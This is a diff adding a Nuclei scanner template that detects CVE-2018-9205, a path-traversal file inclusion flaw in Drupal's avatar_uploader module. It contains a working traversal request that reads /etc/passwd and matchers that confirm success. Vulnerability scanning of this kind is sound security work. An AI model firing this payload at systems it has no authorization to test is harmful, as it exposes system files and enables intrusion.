@@ -1,0 +1,31 @@
+id: drupal-avatar-uploader-file-inclusion
+
+info:
+  name: Drupal avatar_uploader module file parameter LFI
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    avatar_uploader is a module in a content management system maintained by the Drupal community to implement the function of uploading user pictures. Attackers can manipulate file paths or names to trick the server into including unintended files, allowing them to execute malicious code or access sensitive files.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2018-08816
+    - https://www.drupal.org/
+  classification:
+    cve-id: CVE-2018-9205
+    cvss-metrics: 3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x"
